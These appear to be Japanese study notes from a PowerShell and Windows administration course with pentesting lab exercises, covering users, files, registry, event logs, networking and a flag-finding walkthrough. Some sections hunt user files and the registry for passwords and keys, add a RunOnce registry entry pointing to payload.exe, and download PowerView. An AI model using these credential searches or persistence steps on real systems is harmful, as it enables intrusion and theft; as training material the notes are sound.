ホストおよびそれらが属するドメインの状況認識を提供する PowerShell モジュールとスクリプトのコレクションです。このプロジェクトは、BC SecurityによってEmpire Framework の一部として管理されています。  
　  
#### ◇ Inveigh  
Inveigh は、ネットワーク スプーフィングと中間者攻撃を実行するために構築されたツールです。  

#### ◇ BloodHound / SharpHound  
Bloodhound/Sharphound を使用すると、C# および PowerShell で記述されたグラフィカル分析ツールとデータ コレクターを使用して、Active Directory 環境を視覚的にマッピングできます。  
  
## (4) ユーザとグループの管理
### ① ユーザアカウントの種類
* サービスアカウント
* ビルドインアカウント
* ローカルユーザー
* ドメインユーザー
### ② ビルトインアカウント
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">アカウント</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Administrator</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このアカウントは、ローカル ホストで管理タスクを実行するために使用されます。</font></font></td>
</tr>
<tr>
<td><code>Default Account</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">デフォルト アカウントは、Xbox ユーティリティなどのマルチユーザー認証アプリを実行するためにシステムによって使用されます。</font></font></td>
</tr>
<tr>
<td><code>Guest Account</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このアカウントは、通常のユーザー アカウントを持たないユーザーがホストにアクセスできるようにする、権限が制限されたアカウントです。デフォルトでは無効になっており、そのままにしておく必要があります。</font></font></td>
</tr>
<tr>
<td><code>WDAGUtility Account</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このアカウントは、アプリケーション セッションをサンドボックス化できる Defender Application Guard 用に配置されています。</font></font></td>
</tr>
</tbody>
</table>

### ③ PowerShellによるユーザとグループの管理
#### ■ ローカルのユーザ、グループの管理
##### ◇ ローカルグループの一覧を取得  
```
get-localgroup
```

##### ◇ ローカルユーザの一覧を取得  
```
get-localuser
```
　  
##### ◇ 新しいローカルユーザの作成  
```
New-LocalUser -Name $user -Password $Password -Description $description
```
　  
##### ◇ ローカルユーザの変更  
```
Set-LocalUser -Name $user -Password $Password -Description $description
```

##### ◇ ローカルグループへのメンバーの追加
```
Add-LocalGroupMember -Group "$group" -Member "$user"
Get-LocalGroupMember -Name "$group"   ### 追加できたか確認
```

#### ■ ドメインユーザーとグループの管理
##### ◇ AD管理用モジュール(RSATに含まれる)のインストール
```
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online  ### RSATのインストール
Get-Module -Name ActiveDirectory -ListAvailable   ### ADモジュールの確認
```

##### ◇ ドメインユーザの一覧を取得
```
Get-ADUser -Filter *
```

##### ◇ ドメインユーザの識別名による検索
```
Get-ADUser -Identity $str
```

##### ◇ ドメインユーザの属性による検索(例：メールアドレスより検索)
```
Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
```

##### ◇ 新しいドメインユーザの作成
```
New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail  #### ADUserの追加の確認
```

###### 説明が必要な要素の説明
○ ユーザ作成の場所  
`-Surname "Tanaka" -GivenName "Mori"` : この部分はユーザーのLastnameとFirstnameを設定します。  
　  
`-Accountpassword (Read-Host -AsSecureString "AccountPassword")` : この部分では、シェルに新しいパスワードの入力を求めるプロンプトを表示してユーザーのパスワードを設定します。  
　  
`-Enabled $true` : アカウントの使用を有効にしている。これが$Falseに設定されている場合、ユーザーはログインできない。  
　  
○ 確認のところ  
`Get-ADUser -Identity MTanaka -Properties *` : ここでは、MTanakaユーザーのプロパティを検索しています。  
　  
`Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail` : ここでは、PowerShellの実行結果を表出力にし、既定のプロパティと拡張プロパティが含まれるように指示します。

##### ◇ ドメインユーザの属性の変更
```
Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"
Get-ADUser -Identity MTanaka -Property Description  ### 確認
```

## (5) ファイル、ディレクトリ操作
### ① PowerShell Commands and Aliases
| **Command**        | **Alias**            | **Description（説明）**                                                                                  |
|--------------------|----------------------|--------------------------------------------------------------------------------------------------|
| **Get-Item**       | `gi`                 | オブジェクトを取得する（ファイル、フォルダ、レジストリオブジェクトなど）。                              |
| **Get-ChildItem**  | `ls / dir / gci`     | フォルダやレジストリハイブの内容をリストする。                                                         |
| **New-Item**       | `md / mkdir / ni`    | 新しいオブジェクトを作成する（ファイル、フォルダ、シンボリックリンク、レジストリエントリなど）。          |
| **Set-Item**       | `si`                 | オブジェクトのプロパティ値を変更する。                                                                  |
| **Copy-Item**      | `copy / cp / ci`     | アイテムの複製を作成する。                                                                             |
| **Rename-Item**    | `ren / rni`          | オブジェクトの名前を変更する。                                                                         |
| **Remove-Item**    | `rm / del / rmdir`   | オブジェクトを削除する。                                                                               |
| **Get-Content**    | `cat / type`         | ファイルやオブジェクトの内容を表示する。                                                                |
| **Add-Content**    | `ac`                 | ファイルに内容を追加する。                                                                             |
| **Set-Content**    | `sc`                 | ファイルの内容を新しいデータで上書きする。                                                              |
| **Clear-Content**  | `clc`                | ファイル自体を削除せずに内容をクリアする。                                                             |
| **Compare-Object** | `diff / compare`     | 複数のオブジェクトを比較する。これにはオブジェクト自体とその中の内容が含まれる。                           |

## (5) コンテンツの検索とフィルタリング
### ① PowerShellの出力の説明(Object)
PowerShell では、すべてがObject!!!!!  
簡単に言えば、プログラミングでいうとこのオブジェクト指向！！！

#### ◇ オブジェクトとは、
　PowerShell 内のクラスの実体だよ。プロパティとやメソット(関数)を持っているよ。  
　
#### ◇ クラスとは、
　オブジェクトの金型だよ。だからこいつには、プロパティやメソットの定義があるよ。

#### ◇ プロパティとは、
　オブジェクトに関連付けられる値のことだよ。  

#### ◇ メソットとは、
　オブジェクトに関連付けられる関数(処理)のことだよ。

### ② 実際に使ってみよう
#### ◇ オブジェクトのプロパティ、メソットを一覧で表示(Get-member)
```
Get-LocalUser administrator | get-member
```

#### ◇ オブジェクトのプロパティのデータを取得(Select-Object)
```
Get-LocalUser * | Select-Object -Property Name,PasswordLastSet
```

※`Select-Object`自体は、オブジェクトやプロパティを選ぶためのもの
#### ◇ 並べ替えとグループ化(Sort-Object、Group-Object)
```
Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled
```

#### ◇ 今回習ったやつで、サービス情報を簡潔に取得する
```
get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl
```

#### ◇ オブジェクトの検索(Where-Object：where)
```
Get-Service | where DisplayName -like '*Defender*'
```

※プロパティを()に入れて(コマンド)評価するときは、「`$_.プロパティ`」と表す。
##### ○ 比較演算子について
| **Expression**  | **Description（説明）**                                                                                                             |
|-----------------|------------------------------------------------------------------------------------------------------------------------------------|
| **Like**        | Like はワイルドカード式を使用して一致を行う。たとえば、`'*Defender*'` は、値の中に "Defender" という単語が含まれているものすべてに一致する。        |
| **Contains**    | Contains は、プロパティの値に含まれる任意の項目が指定されたものと完全に一致する場合、オブジェクトを取得する。                                |
| **Equal to**    | プロパティの値と正確に一致するか（大文字小文字を区別して）を指定する。                                                                  |
| **Match**       | 与えられた値に対する正規表現の一致を指定する。                                                                                       |
| **Not**         | プロパティが空白または存在しない場合に一致することを指定する。また、`$False` にも一致する。                                            |

※`Like`などは、先頭に`Not`とつけて`NotLike`とすることで除外検索ができる
#### ◇ ディフェンダーサービスの情報収集
```
Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *
```

### ③ PowerShellのパイプラインについて
ワンライナーとか、スクリプトを作成するときにめっちゃ使える
#### ◇ 失敗した場合、実行しないパイプライン(「&&」)
```
Get-Content '.\test.txt' && ping 8.8.8.8
```

#### ◇ 失敗した場合、実行するパイプライン(「||」)
```
Get-Content '.\testss.txt' || ping 8.8.8.8
```
### ④ ディレクトリ内のファイル検索
今回は、例として、興味深いファイルを探すためのスクリプトを作る

#### ◇ ディレクトリ内のファイルの再起検索(Get-ChildItem -File -Recurse)
```
Get-ChildItem -Path $USERPROFILE -File -Recurse 
```
※$USERPROFILE：ログインユーザのホームディレクトリを示す環境変数だよ
#### ◇ 検索範囲の絞り込み(Where-Object：where)
```
where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
```
※ -orを利用することで複数のパターンを検索できるようにしている
#### ◇ 文字列の検索クエリ(Select-String：sls)
```
sls "Password","credential","key"
```
#### ◇ 興味深いファイルを探すコマンド
```
Get-Childitem –Path $USERPROFILE -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName"
```

#### ◇ 特定のいらないディレクトリからの出力を抑えて探す方法(where {($_.Path -Notlike "$str")}
```
Get-Childitem –Path $USERPROFILE -File -Recurse -ErrorAction SilentlyContinue |  where {($_.Name -NotContains "My project\Library\PackageCache\" -and ($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv"))} | sls "Password=","credential=","key=","UserName=" | select-object -Property Path,Line |  where {($_.Path -Notlike "*My project\Library\PackageCache\*")}
```

### ⑤ チェックすべきディレクトリ、ファイル、コマンド
#### ◇ ユーザーの「AppData」フォルダー 
多くのアプリケーションが設定ファイルやドキュメントの一時保存などをそこに格納されている。

#### ◇ ユーザーのホームフォルダー「C:\Users\User\」
作業する場所なので色々置いている。  
VPNキー、SSHキーなどが隠しフォルダーに保存されていることが多い。  
※ 隠しフォルダの表示の仕方(`Get-ChildItem -Hidden`)

#### ◇ コマンドヒストリーファイル
C:\Users<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt  
　  
※そこにない場合、「Get-Content (Get-PSReadlineOption).HistorySavePath」で確認

#### ◇ クリップボードの取得
```
Get-Clipboard
```

#### ◇ タスクスケジューラのタスクの確認
```
Get-ScheduledTask | Get-ScheduledTaskInfo
```

## (6) サービスの操作
### ◇ サービスのヘルプ取得
```
Get-Help *-Service 
```

### ◇ サービス情報の取得
```
Get-Service | ft DisplayName,Status
```

### ◇ ディフェンダーの調査
```
Get-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status
```

### ◇ サービスの再開/開始/再起動
```
Start-Service
Stop-Service
Restart-Service
Suspend-Service
```

### ■ リモートによるサービスの操作
#### ◇ リモートのサービス列挙
```
get-service -ComputerName ACADEMY-ICL-DC
```

#### ◇ リモート呼び出しコマンドによるサービス列挙(Invoke-Command)
```
 invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}
```

## (7) レジストリ操作
### ① レジストリハイブの種類
| Name                  | Abbreviation | Description                                                                                 |
|-----------------------|--------------|---------------------------------------------------------------------------------------------|
| HKEY_LOCAL_MACHINE     | HKLM         | コンピュータの物理状態に関する情報 (ハードウェア、OS、バスタイプ、メモリ、デバイスドライバなど) を含みます。          |
| HKEY_CURRENT_CONFIG    | HKCC         | ホストの現在のハードウェアプロファイルの記録が含まれています。現在のセットアップとデフォルトセットアップの差異を示します。これはHKLMのCurrentControlSetプロファイルキーへのリダイレクトと考えられます。 |
| HKEY_CLASSES_ROOT      | HKCR         | ファイルタイプ情報、UI拡張、後方互換性設定がここに定義されています。                                                      |
| HKEY_CURRENT_USER      | HKCU         | 特定のユーザーごとのOSおよびソフトウェア設定が定義されています。ユーザー設定を含むローミングプロファイル設定がHKCUに保存されます。       |
| HKEY_USERS             | HKU          | デフォルトのユーザープロファイルおよびローカルコンピュータの現在のユーザー構成設定がHKUの下に定義されています。                       |

### ② レジストリの重要性
ペンテスターに​​とって、レジストリは、私たちの取り組みをさらに進めるのに役立つ情報の宝庫!!!  

#### ◇ レジストリにあるもの
インストールされているソフトウェア、現在の OS リビジョン、関連するセキュリティ設定、Defender の制御など、すべてがレジストリにある。

#### ◇ 防御のために
レジストリの概要と主要な値がどこにあるかを理解することで、私たちはより迅速に行動でき、Defender は問題をより早く攻撃を検知できる。

### ① PowerShellによるレジストリの操作
reg.exeも利用できるよ
#### ■ レジストリエントリのクエリ(Get-Item,Get-ChildItem,Get-ItemProperty)
##### ◇ アイテム取得コマンドの利用(Get-ChildItem)
```
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
```
※ これだと、現在実行中のサービス/アプリケーションの名前のみが表示される。
##### ◇ 再帰検索の実行(Get-ChildItem)
```
Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
```
##### ◇ アイテムプロパティの取得コマンドの利用(Get-ItemProperty)
```
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

##### ◇ レジストリコマンドによる検索
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
```

#### ■ レジストリコマンドによるレジストリ内の検索
Reg query: Reg.exe を呼び出して、データを照会することを指定します。  
　  
/f "password": /f は、検索するパターンを設定します。この例では、「パスワード」を検索しています。  
/t REG_SZ: /t は検索する値のタイプを設定します。指定しない場合、reg クエリはすべてのタイプを検索します。  
/s: /s は、すべてのサブキーと値を再帰的に検索することを示します。  
/k: /k は、キー名のみの検索に絞り込みます。  

```
REG QUERY HKCU /F "Password" /t REG_SZ /S /K
```

##### ◇ レジストリを探る価値
ユーザー名、資格情報、キーなどの他のキーワードやフレーズで同様の検索を行ってみる価値があり、いろいろな重要情報も取れたりする。

#### ■ レジストリの作成、削除
##### ◇ レジストリの作成
```
New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey
```

##### ◇ レジストリに値(プロパティ)を入れる
```
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"
```

##### ◇ 登録されている値(プロパティ)の削除
```
Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"
```

## (8) イベントログの操作
### ① イベントログの意義
#### ◇ 防御側視点
SOC アナリストや IT 管理者の観点から見ると、ネットワーク全体のすべてのマシンで発生するイベントを監視、収集、分類することは、疑わしいアクティビティからネットワークをプロアクティブに分析して保護する防御側にとって貴重な情報源！！！

#### ◇ 攻撃側視点
ターゲット環境を把握し、情報の流れを妨害し、痕跡を隠す機会を見つけることができる。  
また、ログ情報を踏まえてより、バレにくい手口を今後のために作成するかもしれない  

### ② イベントログについて
#### ◇ イベントログのカテゴリとタイプ
<table class="table table-striped text-left">
<thead>
<tr>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ログカテゴリ</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ログの説明</font></font></th>
</tr>
</thead>
<tbody>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">システムログ</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">システム ログには、Windows システムとそのコンポーネントに関連するイベントが含まれます。システム レベルのイベントとしては、起動時にサービスが失敗するなどが考えられます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">セキュリティログ</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明は不要ですが、これには、ログインの失敗や成功、ファイルの作成/削除などのセキュリティ関連のイベントが含まれます。これらは、後のモジュールで説明するさまざまな種類の攻撃を検出するために使用できます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">アプリケーションログ</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">システムにインストールされているソフトウェア/アプリケーションに関連するイベントが保存されます。たとえば、Slack の起動に問題がある場合は、このログに記録されます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">セットアップログ</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">このログには、Windows オペレーティング システムのインストール時に生成されるすべてのイベントが保持されます。ドメイン環境では、Active Directory に関連するイベントがドメイン コントローラー ホスト上のこのログに記録されます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">転送されたイベント</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同じネットワーク内の他のホストから転送されるログ。</font></font></td>
</tr>
</tbody>
</table>
#### ◇ イベントログの種類
<table class="table table-striped text-left">
<thead>
<tr>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">イベントの種類</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">イベントの説明</font></font></th>
</tr>
</thead>
<tbody>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エラー</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">起動時にサービスの読み込みに失敗するなど、重大な問題が発生したことを示します。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">あまり重要ではないログですが、将来的に問題が発生する可能性があることを示している可能性があります。たとえば、ディスク容量不足などです。警告イベントは、将来的に問題が発生する可能性があることを通知するために記録されます。警告イベントは通常、アプリケーションが機能やデータを失うことなくイベントから回復できる場合に発生します。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">情報</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ネットワーク ドライバーが正常に読み込まれたときなど、アプリケーション、ドライバー、またはサービスが正常に動作したときに記録されます。通常、すべてのデスクトップ アプリケーションが起動するたびにイベントをログに記録するわけではありません。ログにかなりの量の余分な「ノイズ」が記録される可能性があるためです。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功監査</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザーがシステムにログオンしたときなど、監査対象のセキュリティ アクセス試行が成功したときに記録されます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">失敗監査</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザーがログインしようとしてパスワードを間違って入力した場合など、監査対象のセキュリティ アクセス試行が失敗したときに記録されます。多くの監査失敗イベントは、パスワード スプレーなどの攻撃を示している可能性があります。</font></font></td>
</tr>
</tbody>
</table>
#### ◇ イベントの重大度レベル
<table class="table table-striped text-left">
<thead>
<tr>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">深刻度レベル</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">レベル ＃</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></th>
</tr>
</thead>
<tbody>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">冗長</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">進行状況または成功のメッセージ。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">情報</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">システム上で発生したが、問題は発生しなかったイベント。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">システム管理者が調査する必要がある潜在的な問題。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エラー</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">すぐに対処する必要のない、システムまたはサービスに関連する問題。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">致命的</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これは、システム管理者による緊急の対応を必要とするアプリケーションまたはシステムに関連する重大な問題を示しており、対処しないとシステムまたはアプリケーションの不安定化につながる可能性があります。</font></font></td>
</tr>
</tbody>
</table>

#### ■ イベントログの要素
##### ◇ Log name  
　上で説明したように、イベントが書き込まれるイベント ログの名前。デフォルトではsystem、applications、security、およびのイベントが記録される。  

##### ◇ Event date/time  
　イベントが発生した日時  

##### ◇ Task Category
　記録されたイベントログの種類  

##### ◇ Event ID
　システム管理者が特定のログイベントを識別するための一意の識別子

##### ◇ Source 
　ログの発生元。通常はプログラムまたはソフトウェア アプリケーションの名前。

##### ◇ Level
　イベントの重大度レベル。情報、エラー、詳細、警告、重大のいずれかになります。

##### ◇ User
　イベント発生時にホストにログオンしたユーザー名

##### ◇ Computer
　イベントが記録されたコンピュータの名前

#### ■ イベントログの場所(デフォルト)
```
ls C:\Windows\System32\winevt\logs
```

### ③ イベントログの操作(Wevtutil)
#### ◇ ヘルプ
```
wevtutil /?
```

#### ◇ ログソースの列挙
```
wevtutil el
```

#### ◇ ログ情報の収集(特にログが有効かどうか、最大サイズ、権限、システム上でログが保存される場所などを表示)
```
wevtutil gl "Windows PowerShell"
```

#### ◇ イベントのクエリ検索
```
wevtutil qe Security /c:5 /rd:true /f:text
```

#### ◇ 全てのログの一覧表示(コンピューター上のすべてのログの一覧を表示して、各ログのレコード数を確認できる)
```
Get-WinEvent -ListLog *
```

#### ■ イベントログの検索
##### ◇ 最新の5つのログのみを検索
```
Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
```

##### ◇ ログオン失敗のフィルタリングして検索
```
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
```

##### ◇ マイクロソフト公式の検索クエリの例
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3

## (8) CLIによるネットワークの管理
### ① Windowsで利用されるネットワークプロトコル
| Protocol  | Description                                                                                                           |
|-----------|-----------------------------------------------------------------------------------------------------------------------|
| SMB       | Windowsホストでリソースやファイルを共有し、認証を行います。他のOSではSAMBAが使用されます。                       |
| Netbios   | ネットワーク通信のメカニズム。DNSが失敗した際に代わりとして動作する名前解決機能を提供します。                      |
| LDAP      | 認証・認可のためのプロトコル。Active Directoryなどのディレクトリサービスと通信します。                              |
| LLMNR     | DNSが利用できない場合に名前解決を行うマルチキャストプロトコル。ローカルネットワーク内で動作します。                 |
| DNS       | ホスト名とIPアドレスを対応させる名前解決システム。例: "www.google.com" → "8.8.8.8"。                                |
| HTTP/HTTPS| インターネットでリソースをやり取りするプロトコル。HTTPSはセキュア版です。                                             |
| Kerberos  | ネットワーク認証プロトコル。主にActive Directoryで使用されます。                                                      |
| WinRM     | ホストの管理に使用されるリモート管理プロトコル。                                                                      |
| RDP       | ネットワーク越しにリモートホストのGUIにアクセスするプロトコル。                                                      |
| SSH       | ホストへのセキュアなアクセスやファイル転送、通信を行うプロトコル。                                                   |

### ② PowerShellを利用しない、ネットワーク設定の参照
#### ◇ ip等の参照(ipconfig)
```
ipconfig /all
```

#### ◇ ARPテーブルの参照
```
arp -a
```

#### ◇ DNSの利用(nslookup)
```
nslookup ACADEMY-ICL-DC
```

#### ◇ ポートの接続状況の表示(netstat)
```
netstat -an 
```

### ③ PowerShell ネットコマンドレット
#### ◇ インターフェイスの確認(get-netIPInterface)
```
get-netIPInterface
```

#### ◇ IPアドレスの情報を取得(Get-NetIPAddress)
```
Get-NetIPAddress -ifIndex 25
```

#### ◇ インターフェイスの設定(Set-NetIPInterface)
```
### DHCPの無効化
Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled
```

#### ◇ IPアドレスの設定(Set-NetIPAddress)
```
Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24
Get-NetIPAddress -ifindex 20 | ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength   (適用できたか確認)
```

#### ◇ インターフェイスの再起動(Restrat-NetAdapter
```
Restart-NetAdapter -Name 'Ethernet 3'
```

#### ◇ 接続のテスト(Test-NetConnection)
```
Test-NetConnection   ##通常
```
```
Test-NetConnection　$computer_name -Port $port  ### 特定のポートに接続できるか検証 ⇒ ポートスキャンに使える
```

### ④ リモートアクセス
#### ◇ ssh
```
ssh $user@$IP
```
#### ■ WinRMの使用(winrm)
##### ◇ WinRMの有効化
```
winrm quickconfig
```

* 以下のことが実行される  
　WinRMサービスを有効にする  
　Windows Defender ファイアウォールを介した WinRM の許可 (受信と送信)    
　ローカルユーザーにリモートで管理者権限を付与する    

* WinRMの使用時のセキュリティ強化の仕方   
　リモート管理に使用するIPアドレス/ホスト名のみを含むようにTrustedHostsを構成する   
　トランスポート用にHTTPSを構成する   
　Windows システムを Active Directory ドメイン環境に参加させ、Kerberos 認証を強制する   
##### ◇ WinRMのアクセステスト(Test-WSMan)
```
Test-WSMan -ComputerName "10.129.224.248"  ## 認証無し
```
```
 Test-WSMan -ComputerName "10.129.224.248" -Authentication Negotiate  ## 認証あり
```
##### ◇ WinRMを利用したPowerShellリモートセッション(Enter-PSSession)
```
Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate
```

##### ◇ WinRMの注意点
べつにOSに依存しないのでLinuxからアクセスもできる。  
⇒　適切に認証を管理したり、接続できるマシンを決めないといけない  

## (9) webとのやり取り
### ① シンプルなWebリクエスト
#### ◇ Webレスポンスのオブジェクトを確認
```
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member 
```
##### ◇ 受信コンテンツのフィルタリング
```
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images
```

##### ◇ レスポンスをそのまま受け取る
```
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent
```

### ② Webを利用したファイルのダウンロード
#### ◇ GitHub から PowerView.ps1 をダウンロード(Invoke-WebRequestを利用)
```
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

#### .Netを用いたWebからのダウンロード
```
(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
```

## (10) PowerShell スクリプトと自動化
### ① PowerShellのモジュールで利用されるファイル
| 拡張子  | 説明                                                                 |
|---------|----------------------------------------------------------------------|
| ps1     | *.ps1 拡張子は、実行可能な PowerShell スクリプトを表します。           |
| psm1    | *.psm1 拡張子は、PowerShell モジュール ファイルを表し、モジュールの内容を定義します。|
| psd1    | *.psd1 拡張子は、PowerShell モジュールの内容を記述したデータファイルです。|

### ② モジュールの作り方
モジュールマニフェストを作る ⇒　スクリプト作る　⇒　ヘルプ(Manual)の作成

#### ◇ モジュールマニフェスト(.psd1)とは
- **説明**: モジュールの詳細や属性、依存関係、処理されるコンポーネントを定義するハッシュテーブル。
- **役割**: 
  - モジュールのバージョンや作成者などの**メタデータ**を記述。
  - 必要な PowerShell バージョンやモジュールなどの**前提条件**を定義。
  - スクリプトや形式、タイプなどの**処理指示**を含む。
  - **制限**: エクスポートするエイリアス、関数、変数などを指定。
- **作成**: `New-ModuleManifest` コマンドで簡単に作成可能。

#### ◇ スクリプトを作る
* 必要なモジュールは、インポートをスクリプト内に書く！！
* コメントは、「#」
* あとは、ほかのプログラミング言語と同じ


# --エラーの回避--
権限がない時などアクセス権によるエラーが邪魔な時に使うオプション
```
-ErrorAction SilentContinue
```

# 3 スキルテスト特にの問題
## (1) User4 の Documents フォルダには多数のファイルとフォルダがあります。フラグはそのうちの 1 つにあります。
### ① Documentsフォルダ配下を確認
```
get-childitem -Recurse 
```

同じ名前でflag.txtが書くディレクトリに置いてあり、多くがファイルのサイズがゼロだった
### ② ディレクトリとファイルサイズのみを列挙して、ファイルサイズでソート
```
Get-Childitem -Path C:\Users\user4\Documents -File -Recurse  | select-object -Property Directory,Length | Sort-Object length
```

一つだけファイルサイズが44だった。
### ③ flagを開く
```
Get-Content C:\Users\user4\Documents\3\4\flag.txt
```
